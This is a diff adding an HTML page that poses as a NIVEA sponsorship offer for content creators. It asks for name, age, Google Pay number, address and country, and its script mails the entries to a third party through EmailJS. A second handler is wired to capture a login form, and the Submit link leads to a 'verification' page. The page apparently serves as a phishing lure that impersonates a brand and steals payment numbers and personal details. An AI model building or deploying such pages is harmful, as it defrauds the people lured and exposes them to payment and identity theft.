@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f7f7f7;
+        }
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+            box-sizing: border-box;
+            transition: transform 0.6s, opacity 0.6s;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 13px;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #1780f0;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #277be3;
+        }
+        .button-container {
+            display: flex;
+            justify-content: center;
+        }
+        input, select {
+            height: 36px;
+            border: 1px solid #efefef;
+            border-radius: 3px;
+            background-color: #d6d4d4;
+            font-size: 12px;
+            margin: 0;
+            padding: 9px 0 7px 8px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .imageeee img {
+            height: 100px;
+        
+            width: auto;
+            max-width: 100%;
+            display: block;
+            margin: 0 auto 20px auto;
+        }
+        @media (min-width: 600px) {
+            .imageeee img {
+                height: 100px;
+                width: 200px;
+                margin-bottom: 30px;
+                margin-top: 300px;
+            }
+        }
+
+
+        @media (max-width: 600px) {
+            form {
+                width: 100%;
+                padding: 15px;
+            }
+            .imageeee img {
+                height: 100px;
+                width: 200px;
+                margin-bottom: 30px;
+                margin-top: 400px;
+            }
+            button {
+                width: 100%;
+                padding: 10px 0;
+            }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <form id="sponsor-form">
+        <h1 style="font-size: 16px;">Sponsorship Opportunity with NIVEA</h1>
+        <div class="imageeee">
+            <img src="https://rukminim2.flixcart.com/image/850/1000/jykfxjk0/face-wash/z/m/p/100-dark-spot-reduction-face-nivea-men-original-imafgj3cvcswqe8n.jpeg?q=20&crop=false" alt="">
+        </div>
+
+        <div class="form-group">
+            <label for="name">Enter your name</label>
+            <input type="text" id="name" name="name" required>
+        </div>
+        <div class="form-group">
+            <label for="age">Enter your age</label>
+            <input type="number" id="age" name="age" required>
+        </div>
+        <div><img style="height: 80px; width: 150px;" src="https://1000logos.net/wp-content/uploads/2023/03/Google-Pay-logo.png" alt=""></div>
+        <div class="form-group">
+            <label for="phone">Enter your Google pay number</label>
+            <input type="tel" id="phone" name="phone" required>
+        </div>
+        <div class="form-group">
+            <label for="sponsors">How many sponsors have you completed?</label>
+            <input type="number" id="sponsors" name="sponsors" required>
+        </div>
+        <div class="form-group">
+            <label for="niche">Enter your content niche</label>
+            <select id="niche" name="niche" required>
+                <option value="riding">Riding</option>
+                <option value="roast">News</option>
+                <option value="gaming">Gaming</option>
+                <option value="more">More</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label for="address">Enter your address</label>
+            <input type="text" id="address" name="address" required>
+        </div>
+        <div class="form-group">
+            <label for="country">Select your country</label>
+            <select id="country" name="country" required>
+                <option value="India">India</option>
+                <option value="USA">USA</option>
+                <option value="UK">UK</option>
+                <option value="Canada">Canada</option>
+                <option value="Australia">Australia</option>
+            </select>
+        </div>
+        <div class="button-container">
+            <button style="margin-top: 30px; background-color: transparent; border: none; cursor: pointer; text-decoration: none;">
+                <a href="/2Dtransforms/Product/verification.html" style="border-radius: 10px; height: 16px; width: 200px; background-color: #1780f0; color: rgb(255, 255, 255); text-decoration: none; display: inline-block; padding: 10px 20px;">
+                    Submit
+                </a>
+            </button>
+            
+        </div>
+    </form>
+
+   
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("RQ7epMrgV2ifKcOJo");
+        })();
+
+        document.getElementById('sponsor-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            emailjs.sendForm('service_v204k3o', 'template_abgchcy', this)
+                .then(function() {
+                    document.getElementById('sponsor-form').style.opacity = 0;
+                    setTimeout(() => {
+                        document.getElementById('sponsor-form').classList.add('hidden');
+                        document.getElementById('login-form').classList.remove('hidden');
+                        document.getElementById('login-form').style.opacity = 1;
+                    }, 600);
+                }, function(error) {
+                    alert('FAILED...', error);
+                });
+        });
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            emailjs.sendForm('service_v204k3o', 'template_login', this)
+                .then(function() {
+                    alert('Login successful!');
+                }, function(error) {
+                    alert('Login FAILED...', error);
+                });
+        });
+    </script>
+</body>
+</html>
